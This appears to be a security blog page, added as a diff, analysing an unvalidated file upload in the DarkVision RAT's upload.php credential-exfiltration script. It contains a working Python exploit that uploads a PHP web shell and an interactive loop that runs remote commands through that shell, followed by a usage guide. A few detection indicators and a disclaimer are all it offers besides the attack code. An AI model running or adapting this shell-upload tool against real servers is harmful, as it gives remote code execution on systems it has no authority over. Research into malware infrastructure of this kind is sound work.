@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Technical analysis of DarkVision RAT vulnerability, exploring its password recovery module and demonstrating exploitation techniques.">
+    <meta name="keywords" content="DarkVision RAT, malware analysis, vulnerability research, password recovery, PHP shell, cyber security">
+    <meta name="author" content="Security Researcher">
+    <meta name="robots" content="index, follow">
+    <title>DarkVision RAT: Analyzing Password Recovery Module Vulnerability</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism.min.css">
+</head>
+<body>
+    <div class="window">
+        <div class="title-bar">
+            <span>DarkVision.js</span>
+            <div class="title-bar-buttons">
+                <div>-</div>
+                <div>X</div>
+            </div>
+        </div>
+        <div class="content">
+            <div class="blog-post">
+                <h3>DarkVision RAT Analysis</h3>
+                
+                <p class="blog-intro">
+                    In this technical analysis, we'll explore the DarkVision RAT malware, focusing on its password recovery module vulnerability and demonstrating a practical exploitation technique.
+                </p>
+
+                <h3>Understanding DarkVision RAT</h3>
+                <p>DarkVision RAT is a sophisticated Remote Access Trojan developed in C/C++ and assembly language. A key component of this malware is its automatic password recovery module, which utilizes a simple upload.php script for exfiltrating stolen credentials.</p>
+
+                <h4>Core Components</h4>
+                <ul class="component-list">
+                    <li>Password Recovery Module</li>
+                    <li>File Upload Mechanism</li>
+                    <li>Command & Control Infrastructure</li>
+                </ul>
+
+                <h3>Vulnerability Analysis</h3>
+                <div class="analysis-section">
+                    <p>The vulnerability lies in the password recovery module's upload mechanism. The upload.php script accepts files without proper validation, allowing attackers to upload and execute malicious PHP code.</p>
+
+                    <h4>Key Parameters</h4>
+                    <ul>
+                        <li>hwid: Hardware ID parameter</li>
+                        <li>logfoldername: Directory for uploaded files</li>
+                        <li>uploaded_file: The file being uploaded</li>
+                    </ul>
+                </div>
+
+                <h3>Exploitation Tool</h3>
+                <p class="tool-intro">I've developed a Python script that exploits this vulnerability to gain remote code execution. The script uploads a PHP web shell and provides an interactive terminal interface.</p>
+
+                <div class="code-example">
+                    <h4>Exploitation Script</h4>
+                    <pre><code class="language-python">import requests
+import random
+import string
+import os
+
+def generate_random_string(length=8):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
+def upload_shell(url, hwid, logfoldername, shell_content):
+    shell_file_name = "shell.php"
+    with open(shell_file_name, "w") as f:
+        f.write(shell_content)
+
+    data = {
+        "hwid": hwid,
+        "logfoldername": logfoldername,
+    }
+    files = {
+        "uploaded_file": (shell_file_name, open(shell_file_name, "rb"), "application/x-php"),
+    }
+
+    response = requests.post(url, data=data, files=files)
+    return response</code></pre>
+                </div>
+
+                <h3>Interactive Terminal Implementation</h3>
+                <div class="code-example">
+                    <pre><code class="language-python">def fancy_terminal(shell_url):
+    os.system("clear")
+    print("╔═════════════════════════════════════════════════════════════╗")
+    print("║               DarkVision RAT Vuln - Terminal                ║")
+    print("╚═════════════════════════════════════════════════════════════╝")
+    
+    while True:
+        try:
+            cmd = input("darkvision-vuln@remote $ ").strip()
+            if cmd.lower() in ["exit", "quit"]:
+                break
+
+            response = requests.get(shell_url, params={"cmd": cmd})
+            if response.status_code == 200:
+                output = response.text.strip()
+                if output:
+                    print(output)
+                else:
+                    print("[!] Command executed successfully, but no output was returned.")
+        except KeyboardInterrupt:
+            print("\nSession interrupted. Goodbye!")
+            break</code></pre>
+                </div>
+
+                <h3>Detection</h3>
+                <div class="security-section">
+                    <h4>Indicators</h4>
+                    <ul class="ioc-list">
+                      
+                        <li>upload.php scripts on unknown servers.</li>
+                        <li>HTTP POST requests containing fields like hwid and logfoldername.</li>
+                        <li>upload.php string</li>
+                    </ul>
+                </div>
+
+                <h3>Usage Guide</h3>
+                <div class="usage-section">
+                    <h4>Running the Exploit</h4>
+                    <pre><code class="language-bash"># Start the exploit
+python darkvision_vuln.py
+
+# Enter target URL
+[?] Enter the URL of upload.php: http://target.com/upload.php
+
+# Use the generated shell URL
+[+] Shell URL: http://target.com/uploads/[random_hwid]/[random_folder]/shell.php</code></pre>
+                </div>
+
+                <div class="disclaimer">
+                    <p><strong>Note:</strong> This analysis is for educational and research purposes only. Always obtain proper authorization before testing security tools.</p>
+                </div>
+
+                <div class="references">
+                    <h3>Additional Resources</h3>
+                    <ul>
+                        <li>Detailed Technical Analysis: <a href="https://www.zscaler.com/blogs/security-research/technical-analysis-darkvision-rat" target="_blank">Zscaler Research</a></li>
+                        <li>Source Code: Available in the research repository</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <button onclick="window.history.back()">Back</button>
+        </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/autoloader/prism-autoloader.min.js"></script>
+</body>
+</html>
